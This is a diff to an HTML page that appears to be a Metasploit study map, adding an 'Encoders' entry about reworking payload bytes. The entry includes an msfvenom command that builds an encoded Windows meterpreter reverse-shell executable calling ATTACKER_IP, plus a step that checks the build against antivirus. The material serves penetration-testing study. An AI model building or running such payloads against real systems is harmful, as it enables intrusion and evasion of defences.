@@ -390,6 +390,14 @@ msf6 exploit(...) &gt; set LHOST ATTACKER_IP</code></pre></div>
                       <summary><span class="msf-node-label">EXE</span></summary>
                       <div class="msf-node-body"><p>A payload packaged as an executable, built with msfvenom and caught with exploit/multi/handler. Beyond Metasploit&#39;s own payloads, frameworks like Empire and Cobalt Strike cover the same ground on real engagements.</p></div>
                     </details>
+                  </li>
+                  <li class="msf-node" id="node-pl-encoders">
+                    <details class="msf-node-box">
+                      <summary><span class="msf-node-label">Encoders</span></summary>
+                      <div class="msf-node-body"><p>Rework a payload&#39;s bytes to make it compatible: fit a processor architecture (x86, x64, sparc, ppc, mips) and strip bad characters, such as the null byte, that would break the exploit. show encoders inside a module lists only the ones that fit the current payload. x86/shikata_ga_nai (a polymorphic XOR scheme) was once the go-to for evasion, but modern detection has caught up: encoding alone, even over many -i iterations, rarely gets a payload past antivirus now, so treat encoders as a compatibility tool, not an evasion one. Before 2015 this was msfpayload | msfencode; both are folded into msfvenom. Check a build with msf-virustotal (needs a VirusTotal API key).</p><pre class="msf-cmd"><code>msf6 exploit(...) &gt; show encoders
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=8080 -b &quot;\x00&quot; -e x86/shikata_ga_nai -i 10 -f exe -o payload.exe
+msf-virustotal -k &lt;API key&gt; -f payload.exe</code></pre></div>
+                    </details>
                   </li></ul>
                 </li>
                 <li class="msf-node is-step has-kids" id="node-msf-targets" data-step="5">
